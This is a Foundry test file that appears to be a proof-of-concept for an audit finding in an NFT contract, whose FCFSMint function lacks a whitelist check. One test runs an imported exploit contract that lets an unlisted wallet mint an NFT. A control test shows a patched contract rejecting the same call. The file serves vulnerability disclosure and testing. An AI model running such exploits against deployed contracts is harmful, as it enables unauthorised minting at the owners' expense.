// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {Exploit, RunaAGI, Sig} from "./44183-h-02-fcfsmint-can-be-called-by-anyone-not-only-by-whiteliste.sol";

contract RunaFixed is RunaAGI {
    using Sig for bytes32;

    constructor(address _signer) RunaAGI(_signer) {}

    function FCFSMint(uint256 _salt, bytes32 _msgHash, bytes memory _signature) external payable override {
        require(whitelist[msg.sender], "not whitelisted");
        require(isFCFSMintingActive, "FCFS minting is not active");
        require(saleSupplyMinted + 1 <= saleSupply, "Maximum supply reached");
        require(msg.value == salePrice, "Incorrect ether amount");
        require(fcfsMinted[msg.sender] + 1 <= 2, "Limit reached");
        bytes32 raw = keccak256(abi.encodePacked(msg.sender, _salt));
        bytes32 signedMsgHash = raw.toEthSignedMessageHash();
        require(signedMsgHash == _msgHash, "Invalid message hash!");
        require(_msgHash.recover(_signature) == signer, "Invalid signer!");
        signatures[_signature] = true;
        _safeMint(msg.sender, tokenIdCounter);
        tokenIdCounter++;
        totalSupply++;
        saleSupplyMinted++;
        fcfsMinted[msg.sender] += 1;
    }
}

contract Finding44183Test is Test {
    uint256 internal constant KEY = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
    address internal constant SIGNER = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;

    function _sig(address who, uint256 salt) internal returns (bytes32 ethHash, bytes memory signature) {
        bytes32 raw = keccak256(abi.encodePacked(who, salt));
        ethHash = Sig.toEthSignedMessageHash(raw);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(KEY, ethHash);
        signature = abi.encodePacked(r, s, v);
    }

    function test_exploit_unlisted_wallet_receives_nft() public {
        Exploit e = new Exploit();
        (bytes32 ethHash, bytes memory signature) = _sig(address(e), 1);
        vm.deal(address(this), 1 ether);
        e.run{value: 0.06 ether}(1, ethHash, signature);
        assertEq(e.nft().whitelist(address(e)), false, "not whitelisted");
        assertEq(e.nft().ownerOf(0), address(e), "attacker owns 0");
        assertEq(e.nft().balanceOf(address(e)), 1, "one nft");
        assertEq(address(e.nft()).balance, 0.06 ether, "paid only sale price");
        console.log("whitelisted", e.nft().whitelist(address(e)));
        console.log("owner", e.nft().ownerOf(0));
        console.log("paid wei", address(e.nft()).balance);
    }

    function test_control_unlisted_caller_reverts() public {
        RunaFixed nft = new RunaFixed(SIGNER);
        (bytes32 ethHash, bytes memory signature) = _sig(address(this), 1);
        vm.deal(address(this), 1 ether);
        vm.expectRevert(bytes("not whitelisted"));
        nft.FCFSMint{value: 0.06 ether}(1, ethHash, signature);
        assertEq(nft.balanceOf(address(this)), 0, "no nft");
        assertEq(address(nft).balance, 0, "no payment taken");
    }
}
